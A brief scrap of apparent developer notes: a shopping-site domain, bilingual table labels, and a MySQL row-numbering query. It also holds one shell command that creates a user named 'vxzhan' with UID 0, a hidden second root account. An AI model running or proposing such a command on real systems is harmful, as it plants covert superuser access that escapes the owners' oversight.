www.multimall.cn

卖家（vendor）  商品(wares)   订单(order)   买家（buyer） 



useradd -o -u 0 -g 0 -M -d /root -s /bin/bash vxzhan
select (@i:=@i+1) as i,post_time from tb_check_price,(select @i:=0) as tt  order by post_time desc; 


